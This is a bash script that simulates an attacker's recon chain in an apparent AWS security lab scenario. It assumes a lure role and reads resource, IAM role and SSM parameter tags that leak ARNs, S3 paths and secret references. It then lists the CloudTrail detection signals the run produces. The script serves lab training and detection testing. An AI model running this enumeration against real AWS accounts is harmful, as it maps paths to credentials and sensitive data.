#!/usr/bin/env bash
#
# abuse.sh — Simulate attacker abuse of Scenario 16 (Tag Breadcrumbs Lure)
#
# This scenario deploys to us-east-1 specifically (see main.tf's provider block),
# so every regional call below is pinned to that region regardless of the
# caller's default CLI region.
#
# This script walks through the attack chain step by step with colored output.
# It assumes the caller has valid AWS credentials for any identity in the account.
#
# Usage:
#   chmod +x abuse.sh
#   ./abuse.sh
#
set -euo pipefail

REGION="us-east-1"

# ---------------------------------------------------------------
# Colors and helpers
# ---------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

step() { echo -e "\n${CYAN}[STEP $1]${NC} $2"; }
info() { echo -e "  ${GREEN}[+]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
attack() { echo -e "  ${RED}[ATTACK]${NC} $1"; }

echo -e "${RED}"
echo "============================================="
echo "  SCENARIO 16 — ABUSE CHAIN"
echo "  Tag Breadcrumbs Lure"
echo "============================================="
echo -e "${NC}"

# ---------------------------------------------------------------
step "1" "Resolving account identity"
# ---------------------------------------------------------------
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
CALLER_ARN=$(aws sts get-caller-identity --query "Arn" --output text)
info "Account ID: ${ACCOUNT_ID}"
info "Caller ARN: ${CALLER_ARN}"

# ---------------------------------------------------------------
step "2" "Assuming lure role: resource-inventory-readonly-role"
# ---------------------------------------------------------------
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/resource-inventory-readonly-role"
attack "sts:AssumeRole → ${ROLE_ARN}"

CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_ARN}" \
  --role-session-name "recon-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .SessionToken)
info "Role assumed successfully"

# ---------------------------------------------------------------
step "3" "Broad tag-based resource discovery (tag:GetResources)"
# ---------------------------------------------------------------
attack "resourcegroupstaggingapi:GetResources → every tagged resource in ${REGION}"
aws resourcegroupstaggingapi get-resources --region "${REGION}" --output json \
  | jq '.ResourceTagMappingList[] | {ResourceARN, Tags}'
info "Enumerated tagged resources — note any role/parameter ARNs that look governance-related."

# ---------------------------------------------------------------
step "4" "Pulling tags off the backup automation role (iam:ListRoleTags)"
# ---------------------------------------------------------------
attack "iam:ListRoleTags → prod-backup-automation-role"
aws iam list-role-tags --role-name "prod-backup-automation-role" --output json
warn "Tags leak a ConfigBackup S3 path, a SecretsRef ARN, an EncryptionKeyRef alias, and a"
warn "RelatedPipeline ARN — none of this is a live credential, but it maps the blast radius"
warn "an attacker would chase next if this were real."

# ---------------------------------------------------------------
step "5" "Pulling tags off the service registry SSM parameter (ssm:ListTagsForResource)"
# ---------------------------------------------------------------
PARAM_NAME="/prod/inventory/service-registry"
attack "ssm:ListTagsForResource → ${PARAM_NAME}"
aws ssm list-tags-for-resource --region "${REGION}" \
  --resource-type "Parameter" --resource-id "${PARAM_NAME}" --output json
warn "Tags leak a RelatedRole ARN (prod-data-admin-role), a BackupBucket path, and a"
warn "MonitoringDashboard ARN — more breadcrumbs, same story: tags alone (not the parameter"
warn "value) are the lure here."

# ---------------------------------------------------------------
step "6" "Confirming the parameter VALUE itself is out of reach"
# ---------------------------------------------------------------
warn "This role's policy grants ssm:ListTagsForResource but NOT ssm:GetParameter — reading"
warn "${PARAM_NAME}'s actual value is expected to fail AccessDenied (not attempted here on"
warn "purpose). The tags were the whole point: real recon value without needing read access."

# ---------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------
echo ""
step "7" "Cleaning up session"
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
info "Session credentials cleared"

echo ""
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  Abuse chain complete${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo -e "${YELLOW}Detection signals generated:${NC}"
echo "  • CloudTrail: AssumeRole on resource-inventory-readonly-role"
echo "  • CloudTrail: GetResources (tagging API)"
echo "  • CloudTrail: ListRoleTags on prod-backup-automation-role"
echo "  • CloudTrail: ListTagsForResource on ${PARAM_NAME}"
echo ""
